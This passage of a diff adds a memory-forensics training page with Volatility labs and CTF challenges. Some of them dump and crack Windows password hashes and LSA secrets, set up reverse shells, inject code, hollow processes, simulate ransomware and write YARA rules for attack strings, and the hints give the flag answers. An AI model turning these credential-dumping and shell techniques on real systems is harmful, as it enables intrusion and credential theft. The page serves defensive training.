+              <li>Run <code>vol3 -f memory.raw windows.hivelist</code> — list all loaded registry hives and their virtual offsets</li>
+              <li>Check Run keys: <code>vol3 -f memory.raw windows.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"</code></li>
+              <li>Check RunOnce: <code>vol3 -f memory.raw windows.printkey --key "Software\Microsoft\Windows\CurrentVersion\RunOnce"</code></li>
+              <li>Enumerate services: <code>vol3 -f memory.raw windows.printkey --key "SYSTEM\CurrentControlSet\Services"</code></li>
+              <li>Check for persistence in: <code>Winlogon\Shell</code>, <code>Winlogon\Userinit</code>, <code>Explorer\Shell Folders</code></li>
+              <li>Use <code>vol3 -f memory.raw windows.svcscan</code> to find suspicious service entries</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Password Hash Extraction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Dump NTLM password hashes, cached domain credentials, and LSA secrets from a memory image.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Use any Windows memory dump with local user accounts
+# For domain credentials: use a domain-joined VM with cached logons
+
+# Ensure SAM and SYSTEM hives are in memory (they always are on a running system)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.hashdump</code> — extract NTLM hashes from SAM</li>
+              <li>Identify the format: <code>Username:RID:LM_Hash:NTLM_Hash:::</code></li>
+              <li>Run <code>vol3 -f memory.raw windows.cachedump</code> — extract domain cached credentials (DCC2/mscash2)</li>
+              <li>Run <code>vol3 -f memory.raw windows.lsadump</code> — dump LSA secrets (service passwords, auto-logon creds)</li>
+              <li>Crack extracted hashes with hashcat:
+<pre><code class="language-bash"># NTLM hash (mode 1000)
+hashcat -m 1000 ntlm_hashes.txt /path/to/wordlist.txt
+# DCC2 hash (mode 2100)
+hashcat -m 2100 cached_hashes.txt /path/to/wordlist.txt</code></pre></li>
+              <li>Check for blank or default passwords (NTLM of empty = <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>)</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: File Extraction from Memory</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Locate and extract files cached in memory — executables, documents, scripts — using filescan and dumpfiles.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># In a test VM, open several files:
+#   - A Word document
+#   - A suspicious .exe
+#   - A PowerShell script
+#   - A text file with sensitive data
+# Dump memory while files are open</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw windows.filescan</code> — list all FILE_OBJECT structures</li>
+              <li>Filter for interesting files:
+<pre><code class="language-bash">vol3 -f memory.raw windows.filescan | grep -iE "\.exe|\.dll|\.ps1|\.bat|\.doc|\.pdf|\.txt" | head -40</code></pre></li>
+              <li>Dump a specific file by virtual address: <code>vol3 -f memory.raw windows.dumpfiles --virtaddr &lt;offset&gt;</code></li>
+              <li>Dump all files for a process: <code>vol3 -f memory.raw windows.dumpfiles --pid &lt;pid&gt;</code></li>
+              <li>Verify extracted files: <code>file *.dat</code>, <code>md5sum *.dat</code></li>
+              <li>Search for files in unusual paths: <code>grep -i "temp\|appdata\|public\|downloads" filescan_output.txt</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: YARA Scanning in Memory</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write custom YARA rules and scan a memory dump for indicators of compromise — malware strings, shellcode patterns, and C2 indicators.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-python"># Create a YARA rule file: ioc_rules.yar
+rule Cobalt_Strike_Beacon {
+    meta:
+        description = "Detect Cobalt Strike beacon in memory"
+    strings:
+        $s1 = "%d is an x86 dll" ascii
+        $s2 = "%d is an x64 dll" ascii
+        $s3 = "ReflectiveLoader" ascii
+        $pipe = "\\\\.\\pipe\\" ascii
+        $beacon = "beacon" nocase ascii
+    condition:
+        2 of them
+}
+
+rule Reverse_Shell_Strings {
+    meta:
+        description = "Common reverse shell indicators"
+    strings:
+        $s1 = "COMSPEC" ascii
+        $s2 = "/bin/sh" ascii
+        $s3 = "cmd.exe /c" ascii nocase
+        $s4 = "CreateProcess" ascii
+        $s5 = "WSAStartup" ascii
+        $ip = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}/
+    condition:
+        3 of them
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>vol3 -f memory.raw yarascan.YaraScan --yara-file ioc_rules.yar</code></li>
+              <li>Note which processes and offsets matched each rule</li>
+              <li>Run an inline YARA search: <code>vol3 -f memory.raw yarascan.YaraScan --yara-rules "rule test { strings: \$a = \"password\" condition: \$a }"</code></li>
+              <li>Scan only a specific process: <code>vol3 -f memory.raw yarascan.YaraScan --yara-file ioc_rules.yar --pid &lt;pid&gt;</code></li>
+              <li>Write a rule to detect Base64-encoded PowerShell and test it</li>
+              <li>Combine YARA hits with <code>malfind</code> results — do they overlap?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Timeline Construction from Memory</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Generate a comprehensive timeline from a memory image using Volatility's timeliner plugin. Correlate process, network, and registry events.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Use a memory dump from an incident scenario
+# The dump should have:
+#   - Multiple processes started at different times
+#   - Network connections established at specific times
+#   - Registry modifications with timestamps</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Generate timeline: <code>vol3 -f memory.raw timeliner.Timeliner</code></li>
+              <li>Create a bodyfile for mactime: <code>vol3 -f memory.raw timeliner.Timeliner --create-bodyfile > memory.body</code></li>
+              <li>Convert: <code>mactime -b memory.body -d > timeline.csv</code></li>
+              <li>Open in a spreadsheet — sort by timestamp</li>
+              <li>Identify the attack sequence: initial access → execution → persistence → lateral movement</li>
+              <li>Correlate: when was the malicious process created? When did the C2 connection establish? When were persistence keys written?</li>
+              <li>Create a narrative timeline of the incident from memory evidence alone</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Rootkit Detection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Detect a kernel-level rootkit using cross-view analysis (pslist vs psscan, modules vs modscan), SSDT hooks, and callback manipulation.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Use a memory dump known to contain a rootkit
+# Practice images:
+#   - r2con rootkit challenge samples
+#   - Stuxnet/TDL4 memory samples from research repos
+# Or manually: load a rootkit driver in a lab VM (DANGER: isolated VM only!)
+
+# For safe testing, use a DKOM simulation:
+# Write a kernel driver that unlinks its EPROCESS from ActiveProcessLinks</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compare process views:
+<pre><code class="language-bash">vol3 -f memory.raw windows.pslist > pslist.txt
+vol3 -f memory.raw windows.psscan > psscan.txt
+# Diff PIDs — hidden processes appear only in psscan</code></pre></li>
+              <li>Compare module views:
+<pre><code class="language-bash">vol3 -f memory.raw windows.modules > modules.txt
+vol3 -f memory.raw windows.modscan > modscan.txt
+# Hidden drivers appear only in modscan</code></pre></li>
+              <li>Check SSDT: <code>vol3 -f memory.raw windows.ssdt</code> — entries pointing outside ntoskrnl = hooked</li>
+              <li>Check callbacks: <code>vol3 -f memory.raw windows.callbacks</code></li>
+              <li>Check driver IRP hooks: <code>vol3 -f memory.raw windows.driverirp</code></li>
+              <li>Dump the suspicious driver: <code>vol3 -f memory.raw windows.moddump --base &lt;addr&gt; --dump</code></li>
+              <li>Analyze the dumped driver with <code>strings</code> and a disassembler</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Custom Volatility 3 Plugin Development</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write a custom Volatility 3 plugin that identifies processes with suspicious characteristics — unexpected parent, network activity from GUI apps, or encoded command lines.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-python"># Save as: suspicious_finder.py
+# Place in volatility3/framework/plugins/ or use --plugin-dirs
+
+from volatility3.framework import interfaces, renderers
+from volatility3.framework.configuration import requirements
+from volatility3.plugins.windows import pslist, cmdline
+import re, base64
+
+class SuspiciousFinder(interfaces.plugins.PluginInterface):
+    """Identify processes with suspicious indicators."""
+
+    _required_framework_version = (2, 0, 0)
+
+    @classmethod
+    def get_requirements(cls):
+        return [
+            requirements.TranslationLayerRequirement(
+                name="primary", description="Memory layer"),
+            requirements.SymbolTableRequirement(
+                name="nt_symbols", description="Windows kernel symbols"),
+            requirements.PluginRequirement(
+                name="pslist", plugin=pslist.PsList, version=(2, 0, 0)),
+        ]
+
+    def _generator(self):
+        suspect_parents = {
+            "svchost.exe": ["services.exe"],
+            "smss.exe": ["System"],
+            "csrss.exe": ["smss.exe"],
+            "lsass.exe": ["wininit.exe"],
+        }
+        for proc in pslist.PsList.list_processes(
+            self.context, self.config["primary"],
+            self.config["nt_symbols"]
+        ):
+            name = proc.ImageFileName.cast(
+                "string", max_length=14, errors="replace")
+            pid = proc.UniqueProcessId
+            ppid = proc.InheritedFromUniqueProcessId
+            flags = []
+
+            # Check parent legitimacy
+            lower = name.lower()
+            if lower in suspect_parents:
+                flags.append("CHECK_PARENT")
+
+            yield (0, (pid, name, ppid, ", ".join(flags) if flags else "OK"))
+
+    def run(self):
+        return renderers.TreeGrid(
+            [("PID", int), ("Name", str), ("PPID", int),
+             ("Flags", str)],
+            self._generator(),
+        )</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Save the plugin and run: <code>vol3 --plugin-dirs ./ -f memory.raw suspicious_finder.SuspiciousFinder</code></li>
+              <li>Extend the plugin: add a check for processes with encoded PowerShell command lines</li>
+              <li>Add network connection correlation: flag GUI processes (explorer children) that have ESTABLISHED connections</li>
+              <li>Add a <code>--output-file</code> option to write results to JSON</li>
+              <li>Test against a known-clean memory dump — verify low false-positive rate</li>
+              <li>Test against an infected dump — confirm detection</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: The Rogue Process</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A malicious process is hiding among legitimate system processes. One process has an unusual parent — find it and submit its PID and name as the flag: <code>FLAG{PID_processname}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — in a Windows VM:
+# Rename a payload to svchost.exe, run it from Desktop (wrong path &amp; wrong parent)
+copy C:\Windows\System32\cmd.exe C:\Users\Public\svchost.exe
+start C:\Users\Public\svchost.exe
+# Dump memory with DumpIt</code></pre>
+<pre><code class="language-bash"># Analysis approach
+vol3 -f memory.raw windows.pstree
+vol3 -f memory.raw windows.pslist
+# Look for svchost.exe instances — legitimate ones are parented by services.exe
+# and run from C:\Windows\System32\</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>vol3 -f memory.raw windows.pstree</code> and look for <code>svchost.exe</code> not parented by <code>services.exe</code>. Then check its image path with <code>vol3 -f memory.raw windows.dlllist --pid &lt;pid&gt;</code> — the legitimate path is <code>C:\Windows\System32\svchost.exe</code>. Anything else is the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: C2 Phone Home</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">An attacker established a command-and-control channel. Find the remote C2 IP and port from the network connections. Flag format: <code>FLAG{IP:PORT}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — in a VM:
+# Start a Meterpreter session or netcat reverse shell to 10.13.37.100:4444
+# Add some normal network noise (browse websites, etc.)
+# Dump memory
+
+# Analysis
+vol3 -f memory.raw windows.netscan</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>vol3 -f memory.raw windows.netscan</code> and look for ESTABLISHED connections. Cross-reference the owning PID with <code>pslist</code> — if a process like <code>notepad.exe</code> or <code>svchost.exe</code> (from wrong path) has an outbound connection, that's the C2. The IP:PORT on the foreign/remote side is your flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Hash Heist</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Extract the Administrator's NTLM password hash from the memory dump and crack it. The plaintext password is the flag: <code>FLAG{password}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — set Administrator password to a crackable value:
+net user Administrator P@ssw0rd123! /active:yes
+# Dump memory
+
+# Analysis
+vol3 -f memory.raw windows.hashdump</code></pre>
+<pre><code class="language-bash"># Crack with hashcat
+# Extract the NTLM hash (4th field in hashdump output)
+echo "&lt;ntlm_hash&gt;" > hash.txt
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>vol3 -f memory.raw windows.hashdump</code>. The output format is <code>User:RID:LM:NTLM:::</code>. Take the NTLM hash for Administrator and crack it with <code>hashcat -m 1000</code> or look it up on <code>crackstation.net</code>. The password <code>P@ssw0rd123!</code> is in common wordlists.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Invisible Code</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Code has been injected into a legitimate process. Find the injected process, dump the payload, and extract the URL embedded in it. Flag format: <code>FLAG{url}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — inject shellcode containing a URL into explorer.exe:
+# Use a simple injector that calls VirtualAllocEx + WriteProcessMemory
+# The shellcode/payload contains: "http://evil.c2server.com/beacon"
+# Dump memory
+
+# Analysis
+vol3 -f memory.raw windows.malfind
+vol3 -f memory.raw windows.malfind --dump</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>vol3 -f memory.raw windows.malfind</code> to find processes with <code>PAGE_EXECUTE_READWRITE</code> private memory containing code. Dump the flagged regions with <code>--dump</code>, then run <code>strings -a *.dmp | grep -i "http"</code> to find the embedded URL. The URL in the injected code is the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Recovered Secrets</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A file was opened, read, then deleted from disk — but its contents are still in memory. Recover the file and find the flag inside it. Flag format: <code>FLAG{...}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — in a VM:
+echo "TOP SECRET: FLAG{memory_never_forgets}" > C:\Users\Public\secret.txt
+type C:\Users\Public\secret.txt          # force it into file cache
+del C:\Users\Public\secret.txt           # delete from disk
+# Dump memory — the file content remains in the filesystem cache</code></pre>
+<pre><code class="language-bash"># Analysis approach
+vol3 -f memory.raw windows.filescan | grep -i "secret"
+vol3 -f memory.raw windows.dumpfiles --virtaddr &lt;offset&gt;</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>vol3 -f memory.raw windows.filescan | grep -i "secret"</code> to find the FILE_OBJECT. Even though the file is deleted from disk, the kernel may still have a cached copy. Use <code>vol3 -f memory.raw windows.dumpfiles --virtaddr &lt;offset&gt;</code> to extract it. If that fails, try <code>yarascan.YaraScan --yara-rules "rule f { strings: \$a = \"FLAG{\" condition: \$a }"</code> to search raw memory.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Kernel Phantom</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A rootkit has hidden itself from the OS. The process doesn't appear in Task Manager or <code>pslist</code>. Find the hidden process name and its PID. Flag: <code>FLAG{PID_processname}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup: use a memory dump containing a DKOM rootkit
+# The rootkit unlinks its EPROCESS from ActiveProcessLinks
+# pslist won't show it, but psscan will find the pool tag
+
+# Analysis — cross-view detection
+vol3 -f memory.raw windows.pslist > pslist_output.txt
+vol3 -f memory.raw windows.psscan > psscan_output.txt</code></pre>
+<pre><code class="language-bash"># Find the diff
+diff &lt;(awk '{print $1}' pslist_output.txt | sort -n) \
+     &lt;(awk '{print $1}' psscan_output.txt | sort -n)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The rootkit uses DKOM to unlink the process. <code>pslist</code> traverses the doubly-linked <code>ActiveProcessLinks</code> list and misses it. <code>psscan</code> uses pool tag scanning (<code>Proc</code>) across all physical memory and finds it regardless. Diff the two outputs — the PID in <code>psscan</code> but not <code>pslist</code> is the hidden process.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Crypto Key Hunt</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Ransomware encrypted files on the system. The encryption key is still in the malware process's memory. Extract the AES key. Flag format: <code>FLAG{hex_key}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — simulate ransomware with a Python script in the VM:
+# The script generates a key, encrypts files, keeps key in memory</code></pre>
+<pre><code class="language-python"># ransom_sim.py (run in VM before memory dump)
+from Crypto.Cipher import AES
+import os, time
+
+key = bytes.fromhex("4e6f745265616c4b65794275744f4b21")  # 16-byte AES key
+# key hex = 4e6f745265616c4b65794275744f4b21
+cipher = AES.new(key, AES.MODE_CBC, iv=os.urandom(16))
+# ... encrypt files ...
+print("Encryption complete. Key still in memory.")
+time.sleep(99999)  # keep process alive</code></pre>
+<pre><code class="language-bash"># Analysis
+vol3 -f memory.raw windows.pslist | grep -i python
+vol3 -f memory.raw windows.memdump --pid &lt;python_pid&gt; --dump
+strings -a pid.*.dmp | grep -oP '[0-9a-f]{32}'</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Find the ransomware process (<code>python.exe</code> or the custom binary) with <code>pslist</code>. Dump its memory with <code>windows.memmap --dump --pid &lt;pid&gt;</code>. Then search for the AES key pattern — it's a 16-byte (32 hex char) value. Use <code>findaes</code> (bulk_extractor plugin) or YARA: <code>strings -a</code> and grep for hex patterns near "AES" or "key" references. The key is <code>4e6f745265616c4b65794275744f4b21</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Attack Reconstruction</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">An attacker compromised this system. Using only the memory dump, reconstruct the full attack chain: initial access, execution, persistence, and exfiltration. Write the attacker's C2 domain as the flag: <code>FLAG{domain}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — simulate a multi-stage attack in a VM:
+# 1. Phishing: user opens malicious .hta file via mshta.exe
+# 2. Execution: mshta spawns PowerShell with encoded command
+# 3. C2: PowerShell connects to evil-updates.attacker.com:443
+# 4. Persistence: adds Run key
+# 5. Credential dump: runs mimikatz in memory
+# Dump memory after all stages complete</code></pre>
+<pre><code class="language-bash"># Investigation workflow
+vol3 -f memory.raw windows.pstree          # find the process chain
+vol3 -f memory.raw windows.cmdline         # see encoded commands
+vol3 -f memory.raw windows.netscan         # find C2 connections
+vol3 -f memory.raw windows.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
+vol3 -f memory.raw windows.malfind         # injected code
+vol3 -f memory.raw timeliner.Timeliner     # timeline it all</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Start with <code>pstree</code> — find <code>mshta.exe</code> spawning <code>powershell.exe</code>. Check <code>cmdline</code> for the PowerShell process — decode the Base64 encoded command to find the C2 domain. Cross-reference with <code>netscan</code> to confirm the connection to that domain. The domain in the decoded command and network connection is the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: The Ghost in the Process List</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A process has been hollowed — it looks like a legitimate Windows binary but is running attacker code. Find the hollowed process. The flag is the MD5 hash of the dumped malicious code: <code>FLAG{md5hash}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — perform process hollowing on svchost.exe:
+# Start svchost.exe suspended → unmap image → map malicious PE → resume
+# Use a process hollowing PoC tool in a lab VM
+# Dump memory after hollowing is complete</code></pre>
+<pre><code class="language-bash"># Analysis
+vol3 -f memory.raw windows.malfind
+# Look for svchost.exe with MZ header in a private VAD region
+vol3 -f memory.raw windows.malfind --pid &lt;hollowed_pid&gt; --dump
+md5sum pid.*.dmp</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>malfind</code> and look for a <code>svchost.exe</code> instance with a full PE (MZ header) in a <code>PAGE_EXECUTE_READWRITE</code> VAD region — this is the hollowed process. Legitimate svchost loads its code from the on-disk image (mapped section), not private memory. Dump the malicious region and compute its MD5.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Full Memory Investigation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Complete incident response using memory forensics. A workstation was compromised. Find: (1) the initial payload filename, (2) the attacker's IP, (3) the persistence mechanism, (4) exfiltrated data. Combine all four as the flag: <code>FLAG{filename_IP_persistence_data}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Setup — full attack simulation:
+# 1. Drop payload: C:\Users\Public\update_helper.exe
+# 2. Payload connects to 203.0.113.66:8443
+# 3. Persistence: scheduled task "WindowsUpdateHelper"
+# 4. Exfil: reads and sends C:\Users\victim\Documents\passwords.kdbx
+# Dump memory</code></pre>
+<pre><code class="language-bash"># Full investigation workflow
+# Step 1: Identify suspicious processes
+vol3 -f memory.raw windows.pstree
+vol3 -f memory.raw windows.cmdline
+
+# Step 2: Network connections
+vol3 -f memory.raw windows.netscan
+
+# Step 3: Check persistence
+vol3 -f memory.raw windows.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
+vol3 -f memory.raw windows.svcscan
+vol3 -f memory.raw windows.scheduled_tasks
+
+# Step 4: File activity
+vol3 -f memory.raw windows.filescan | grep -i "password\|kdbx\|exfil\|update_helper"
+vol3 -f memory.raw windows.handles --pid &lt;payload_pid&gt; | grep -i "file"
+
+# Step 5: Correlate and build the narrative
+vol3 -f memory.raw timeliner.Timeliner</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Work systematically: (1) <code>pstree</code> + <code>cmdline</code> to find <code>update_helper.exe</code>. (2) <code>netscan</code> filtered by that PID reveals <code>203.0.113.66:8443</code>. (3) <code>svcscan</code> or <code>scheduled_tasks</code> finds "WindowsUpdateHelper". (4) <code>handles</code> for the payload PID shows an open handle to <code>passwords.kdbx</code>. Flag: <code>FLAG{update_helper.exe_203.0.113.66_WindowsUpdateHelper_passwords.kdbx}</code>.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</body>
+</html>
